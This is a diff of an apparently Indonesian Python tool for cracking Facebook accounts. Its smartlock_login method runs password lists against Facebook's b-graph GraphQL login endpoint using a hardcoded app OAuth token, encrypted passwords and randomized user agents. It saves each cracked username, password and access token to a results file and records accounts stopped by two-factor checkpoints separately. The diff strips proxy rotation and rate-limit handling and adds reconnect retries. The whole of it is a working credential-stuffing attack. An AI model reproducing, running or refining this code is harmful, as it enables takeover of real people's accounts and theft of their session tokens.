@@ -736,21 +736,13 @@ class Facebook:
     def smartlock_login(self, user, passwords):
         global log
         KenXinDev(f'[bold bright_black]   ──> [bold white]Crack {user[:8]}/{len(temp_dump)}/[bold green]{log["success"]}[/bold green]/[bold yellow]{log["checkpoint"]}[/bold yellow]/{log["loop"]}[/]', end='\r')
-
         for pwd in passwords:
-            for attempt in range(3):
-                proxy = get_random_proxy()
                 try:
                     # Enkripsi password
                     encrypted_pass = self.enc.PWD_FB4A(pwd)
-
                     # Random user-agent & locale
                     ua_str, loc = self.generate_facebook_user_agent()
-
                     curl = requests.Session()
-                    if proxy:
-                        curl.proxies = {'http': proxy, 'https': proxy}
-
                     curl.headers.update({
                         'Host': 'b-graph.facebook.com',
                         'Authorization': 'OAuth 121876164619130|1ab2c5c902faedd339c14b2d58e929dc',
@@ -814,65 +806,34 @@ class Facebook:
                     }
 
                     response = curl.post(
-                        "https://b-graph.facebook.com/graphql",
-                        data=data,
-                        timeout=25
-                    ).json()
-
-                    # # ---------- CEK RATE LIMIT ----------
-                    # if 'errors' in response:
-                    #     for err in response['errors']:
-                    #         if 'Anda Diblokir Sementara' in err.get('summary', ''):
-                    #             KenXin_Warning("Anda Diblokir Sementara. Mode pesawat 5 detik...")
-                    #             time.sleep(3)
-                    #             # Langsung keluar dari loop attempt -> lanjut ke password berikutnya
-                    #             break
-                    #     # Jika break terjadi (rate limit), maka keluar dari for attempt
-                    #     else:
-                    #         # Jika tidak ada rate limit tapi ada error lain, kita lanjutkan saja (anggap gagal)
-                    #         pass
-                    #     # Setelah penanganan error, langsung lanjut ke password berikutnya (tanpa eksekusi kode di bawah)
-                    #     break   # ini break untuk for attempt, akan keluar dan melanjutkan ke pwd berikutnya
-
-                    # ---------- PROSES RESPONS NORMAL ----------
+                        "https://b-graph.facebook.com/graphql",data=data).json()
                     if response.get('data') and response['data'].get('fb_bloks_action') and response['data']['fb_bloks_action'].get('root_action'):
                         server_respon1 = response['data']['fb_bloks_action']['root_action']['action']['action_bundle']['bloks_bundle_action']
                         server_respon2 = server_respon1.replace('\\', '')
                         if 'session_key' in server_respon2 or 'EAAAAU' in server_respon2:
                             log['success'] += 1
-                            # cookie = "; ".join(["{}={}".format(k, v) for k, v in curl.cookies.get_dict().items()])
                             token = re.search(r'"access_token":"([^"]+)"', server_respon2).group(1)
                             KenXinDev(Panel(Panel(f"[bold green][+] Username : {user}\n[+] Password : {pwd}\n[+] Access Token : {token}\n[+] User Agent : {ua_str}[/bold green]", style='bold green'), width=80, style='bold bright_black', title='[bold green]Login-Success[/bold green]'))
                             open(file_result["success"], 'a', encoding='utf-8').write(f"{user}|{pwd}|{token}\n")
-                            return   # sukses, keluar dari fungsi
+                            break
                         elif 'redirect_login_challenges' in server_respon2 or 'com.bloks.www.ap.two_step_verification.entrypoint_async' in server_respon2:
                             log['checkpoint'] += 1
                             KenXinDev(Panel(Panel(f"[bold yellow][+] Username : {user}\n[+] Password : {pwd}\n[+] User Agent : {ua_str}[/bold yellow]", style='bold yellow'), width=80, style='bold bright_black', title='[bold yellow]Login-Checkpoint[/bold yellow]'))
                             open(file_result['checkpoint'], 'a', encoding='utf-8').write(f"{user}|{pwd}|{ua_str}\n")
-                            return   # checkpoint juga keluar
-                        else:
-                            # password salah
                             break
-                    else:
-                        break
+                        else:
+                            continue
+                    
                 except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
-                    if proxy:
-                        remove_proxy(proxy)
-                    if attempt == 2:
-                        pass  # abaikan setelah 3 kali gagal
-                    continue
-                except Exception as e:
+                    KenXin_Warning('Koneksi Internet Error!')
+                    time.sleep(5)
+                    self.smartlock_login(user, passwords)
+                    log['loop'] -= 1
                     break
+                except Exception as e:pass
         log['loop'] += 1
 
 # ==================== MAIN ====================
 if __name__ == "__main__":
     create_folders()
-    load_proxies()
     LoginFacebook().login_cookie()
-
-# load_proxies()
-# for i in open('list.txt', 'r').readlines():
-#     username = i.split("|")[0]
-#     password = i.split("|")[1]
-#     Facebook('', '', '', '').smartlock_login(username, [password])
